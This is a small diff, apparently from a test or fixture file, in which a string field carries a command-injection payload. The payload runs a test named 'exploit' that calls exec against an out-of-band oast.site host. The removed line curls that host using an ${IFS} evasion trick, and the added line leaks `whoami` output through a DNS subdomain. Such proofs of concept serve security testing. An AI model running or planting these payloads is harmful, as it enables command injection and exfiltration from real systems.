@@ -3,7 +3,7 @@
     content: "`$(
       node -e \"const { test } = require('./integrations/utils'); 
       test('exploit', { fs: {} }, async ({ exec }) => {
-        await exec('curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site');
+        await exec('`whoami`.m1o7mgfkflj0fxikvrd8p6jwispq9uiuz.oast.site');
       }, { only: true })\"
     )`";
   }
